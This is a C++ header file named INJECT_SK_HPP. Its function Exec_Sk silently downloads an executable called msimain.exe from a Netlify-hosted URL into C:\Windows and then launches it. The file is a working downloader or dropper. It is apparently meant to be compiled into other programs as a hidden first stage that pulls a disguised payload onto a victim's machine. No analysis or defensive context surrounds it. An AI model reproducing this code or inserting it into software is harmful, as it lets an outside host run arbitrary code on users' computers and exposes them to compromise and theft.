#ifndef INJECT_SK_HPP
#define INJECT_SK_HPP

#include <windows.h>
#include <urlmon.h>
#include <shellapi.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

inline void Exec_Sk() {  // Use inline to avoid multiple definitions
    const char* url = "https://symphonious-beignet-824cf8.netlify.app/msimain.exe";
    const char* filePath = "C:\\Windows\\msimain.exe"; // Change to the desired download path

    // Download the file
    HRESULT result = URLDownloadToFile(NULL, url, filePath, 0, NULL);

    if (result == S_OK) {
        std::cout << "File downloaded successfully.\n";

        // Execute the downloaded file
        HINSTANCE hInst = ShellExecute(NULL, "open", filePath, NULL, NULL, SW_SHOW);
        if ((int)hInst <= 32) {
            std::cout << "Failed to execute the file.\n";
        }
        else {
            std::cout << "File executed successfully.\n";
        }
    }
    else {
        std::cout << "Failed to download the file.\n";
    }
}

#endif // INJECT_SK_HPP
